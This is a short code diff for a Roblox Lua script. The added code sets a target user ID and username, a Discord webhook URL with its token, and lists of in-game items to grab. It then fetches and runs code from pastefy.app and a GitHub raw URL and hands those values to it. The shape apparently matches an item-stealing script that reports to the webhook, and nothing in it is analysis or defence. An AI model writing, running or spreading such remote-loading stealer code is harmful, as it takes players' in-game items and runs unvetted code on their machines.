@@ -1,1 +1,30 @@
-loadstring(game:HttpGet("https://botthepan.onrender.com/script/0d85c52ef441babb"))()
+local TARGET_ID = 7695970259
+local TARGET_USER = "11_Delinyer"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1563271477745156146/5qyAp_LD9bkTThJhbV-hshxoTylBr0YHgecuFuMaWb6yfm7_VKdDJ1lam9OTd6FGT_B_"
+
+local TargetBrainrots = {
+    
+}
+
+local TargetBaseSkins = {
+    
+}
+
+local TargetGears = {
+    ["Alien Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
+
+task.wait(1)
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
